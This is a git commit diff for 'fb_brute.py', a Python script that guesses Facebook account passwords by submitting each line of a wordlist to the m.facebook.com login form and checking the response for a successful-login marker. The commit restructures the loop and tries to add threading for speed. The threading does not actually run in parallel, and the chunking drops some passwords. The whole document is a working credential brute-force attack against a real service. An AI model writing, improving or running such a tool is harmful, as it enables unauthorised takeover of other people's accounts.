7e449f2d665bd4fa59353299b8b0447297163807
j03-dev <24nomeniavo@gmail.com>
2022-09-01 16:43:33 +0300

    [version 1.2] - thread for more perf

--- fb_brute.py
+++ fb_brute.py
@@ -1,9 +1,9 @@
 #!/usr/bin/env python2
 import os
-import sys
 from browser import Browser
 import argparse
 from colorama import *
+import threading
 
 
 parser = argparse.ArgumentParser()
@@ -12,29 +12,48 @@ parser.add_argument('-p', metavar="pass_dir", type=str, nargs="?")
 args = parser.parse_args()
 
 url = "https://m.facebook.com"
-browser = Browser()
 
-def main(username, wordlist):
+
+def login_bruteforce(username, wordlist):
+    browser = Browser()
+    for password in wordlist:
+        try:
+            password = password.strip("\n")
+            response = browser.request_from(url, {'email': username, 'pass': password})
+            verificatiion = "/save-device/" in response
+            print(Fore.RED + "{0} => {1}: {2}".format(password, (verificatiion), response) + Fore.WHITE)
+            if verificatiion:
+                print(Fore.GREEN + "{0} => {1}".format(password, (verificatiion)) + Fore.WHITE)
+                exit()
+        except KeyboardInterrupt:
+            print("Exit Programme !")
+            exit()
+
+
+def dived(wordlist):
+    newpassword = []
     if os.path.exists(wordlist):
         with open(str(wordlist), "r") as wordlist_file:
             list_of_password = wordlist_file.readlines()
-            print("Start brute forcing")
-            for password in list_of_password:
-                try:
-                    password = password.strip("\n")
-                    response = browser.request_from(url, {'email': username, 'pass': password})
-                    verificatiion = "/save-device/" in response
-                    print(Fore.RED + "{0} => {1}: {2}".format(password, (verificatiion), response) + Fore.WHITE)
-                    if verificatiion:
-                        print(Fore.GREEN + "{0} => {1}".format(password, (verificatiion)) + Fore.WHITE)
-                        break
-                except KeyboardInterrupt:
-                    print("Exit Programme !")
-                    exit()
-    else:
-        print("Wordlist file don't find !")
+            ndiv = len(list_of_password) // 4
+            backup = []
+            i = 0
+            for pwd in list_of_password:
+                backup.append(pwd)
+                i += 1
+                if i == ndiv:
+                    newpassword.append(backup)
+                    # reset variable
+                    backup = []
+                    i = 0
+    return newpassword
+
+
+def hydra(username, wordlist):
+    the_wordlist = dived(wordlist)
+    [threading.Thread(login_bruteforce(username, wordlist_)).start() for wordlist_ in the_wordlist]
 
 
 if __name__ == "__main__":
-    main(args.u, args.p)
+    hydra(args.u, args.p)
 
